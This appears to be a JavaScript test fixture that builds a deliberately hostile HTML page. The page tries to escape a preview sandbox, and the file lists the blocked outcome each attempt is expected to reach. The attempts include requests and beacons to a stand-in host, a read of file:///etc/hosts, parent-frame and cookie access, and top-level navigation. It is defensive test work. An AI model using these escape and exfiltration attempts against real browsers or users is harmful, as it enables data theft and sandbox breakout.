// A page that tries every way out of the preview sandbox and reports what happened, shared by the browser tests.
const HIT = 'window.__hit=1';

// Reports through the console, which the test reads from outside the frame.
const REPORT = "const report = (n, v) => console.log('ATTACK ' + n + ' ' + v);\ndocument.addEventListener('securitypolicyviolation', e => console.log('VIOLATION ' + e.violatedDirective + ' ' + e.blockedURI));";

const ATTACKS = {
  fetch: "fetch('https://remote.test/fetch').then(() => 'REACHED')",
  xhr: "new Promise(done => { const x = new XMLHttpRequest(); x.onload = () => done('REACHED'); x.onerror = () => done('blocked'); x.open('GET', 'https://remote.test/xhr'); x.send(); })",
  beacon: "navigator.sendBeacon('https://remote.test/beacon', 'x')",
  websocket: "new Promise(done => { const w = new WebSocket('wss://remote.test/ws'); w.onopen = () => done('REACHED'); w.onerror = () => done('blocked'); })",
  'remote-img': "new Promise(done => { const i = new Image(); i.onload = () => done('REACHED'); i.onerror = () => done('blocked'); i.src = 'https://remote.test/img.png'; })",
  'file-fetch': "fetch('file:///etc/hosts').then(() => 'REACHED')",
  'file-img': "new Promise(done => { const i = new Image(); i.onload = () => done('REACHED'); i.onerror = () => done('blocked'); i.src = 'file:///System/Library/Desktop%20Pictures/.thumbnails/x.png'; })",
  'dynamic-import': "import('https://remote.test/mod.js').then(() => 'REACHED')",
  'parent-document': "parent.document.title",
  'parent-storage': "parent.localStorage.length",
  'parent-location': "parent.location.href",
  'top-location': "(top.location = 'https://remote.test/top', 'REACHED')",
  'window-open': "window.open('https://remote.test/popup') ? 'REACHED' : 'blocked'",
  'link-popup': "(document.getElementById('pop').click(), 'clicked')",
  storage: "localStorage.length",
  cookie: "document.cookie",
};

const hostileHtml = (attacks = ATTACKS) => `<!doctype html><html><head><title>hostile</title>
<link rel="stylesheet" href="https://remote.test/s.css">
<style>@import url(https://remote.test/i.css); @font-face { font-family: f; src: url(https://remote.test/f.woff); } body { font-family: f; background: url(https://remote.test/bg.png); }</style>
<script>window.addEventListener('message', e => { if (typeof e.data === 'string' && e.data.startsWith('NESTED ')) console.log(e.data); });</script>
</head><body><h1>hostile</h1>
<base href="https://remote.test/base/"><img src="relative.png">
<img src="https://remote.test/tag.png"><video src="https://remote.test/v.mp4" autoplay></video>
<iframe src="https://remote.test/frame"></iframe><object data="https://remote.test/obj"></object>
<iframe srcdoc="<script>const say = m => parent.postMessage('NESTED ' + m, '*'); document.addEventListener('securitypolicyviolation', e => say('violation ' + e.violatedDirective + ' ' + e.blockedURI)); say('ran'); fetch('https://remote.test/nested').catch(() => say('fetch failed'))<\/script>"></iframe>
<a id="pop" href="https://remote.test/link" target="_blank">go</a>
<script>${REPORT}
const attempt = async (name, run) => {
  report(name, 'ran');
  try { report(name, 'gave ' + await run()); } catch (e) { report(name, 'threw ' + e.name); }
};
(async () => {
  console.log('ATTACK origin ' + self.origin);
${Object.entries(attacks).map(([k, v]) => `  await attempt(${JSON.stringify(k)}, () => ${v});`).join('\n')}
  report('finished', 'yes');
})();
</script></body></html>`;
const HOSTILE_HTML = hostileHtml();

// What each attack must come to. sendBeacon says true once it has queued, and the policy stops it after that.
const ATTACK_ENDS = {
  fetch: 'threw TypeError', xhr: 'gave blocked', beacon: 'gave true', websocket: 'gave blocked', 'remote-img': 'gave blocked',
  'file-fetch': 'threw TypeError', 'file-img': 'gave blocked', 'dynamic-import': 'threw TypeError',
  'parent-document': 'threw SecurityError', 'parent-storage': 'threw SecurityError', 'parent-location': 'threw SecurityError',
  'top-location': 'threw SecurityError', 'window-open': 'gave blocked', 'link-popup': 'gave clicked', storage: 'threw SecurityError', cookie: 'threw SecurityError',
};

module.exports = { HIT, ATTACKS, ATTACK_ENDS, HOSTILE_HTML, hostileHtml };
